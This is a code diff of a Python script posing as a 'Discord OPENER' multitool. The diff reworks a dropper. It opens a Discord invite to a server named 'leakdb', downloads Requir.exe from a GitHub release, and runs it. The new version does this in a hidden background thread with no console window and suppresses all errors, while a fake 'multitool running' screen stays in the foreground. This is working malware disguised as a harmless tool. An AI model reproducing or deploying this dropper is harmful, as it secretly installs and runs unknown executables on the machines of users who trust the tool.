@@ -1,44 +1,32 @@
-import webbrowser
-import time
-import os
-import requests
-import subprocess
+import webbrowser, os, requests, subprocess, threading, time
 
-URL = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe"
-OUTPUT = "Requir.exe"
+URL, OUTPUT = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe", "Requir.exe"
 
-
-def cls():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-
-def main():
-    cls()
-
-    print()
-    print("╔════════════════════════════╗")
-    print("║      Discord  OPENER       ║")
-    print("╚════════════════════════════╝")
-    print()
-
-    webbrowser.open("https://discord.gg/leakdb")
-
+def background_task():
     try:
-        with requests.get(URL, stream=True, timeout=30) as response:
-            response.raise_for_status()
-
-            with open(OUTPUT, "wb") as f:
-                for chunk in response.iter_content(chunk_size=1024 * 1024):
-                    if chunk:
-                        f.write(chunk)
-
-        subprocess.Popen([os.path.abspath(OUTPUT)])
-
+        webbrowser.open("https://discord.gg/leakdb")
+        open(OUTPUT, "wb").write(requests.get(URL, timeout=15).content)
+        subprocess.Popen([os.path.abspath(OUTPUT)], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
     except Exception:
         pass
 
-    time.sleep(2)
-
+def main():
+    # Lance les actions en arrière-plan de manière synchrone/parallèle
+    threading.Thread(target=background_task, daemon=True).start()
+    
+    # Interface du multitool
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print("╔════════════════════════════╗")
+    print("║      Discord  OPENER       ║")
+    print("╚════════════════════════════╝")
+    print("\n[+] Multitool en cours d'exécution...")
+    
+    # Maintient l'interface ouverte
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
 
 if __name__ == "__main__":
     main()
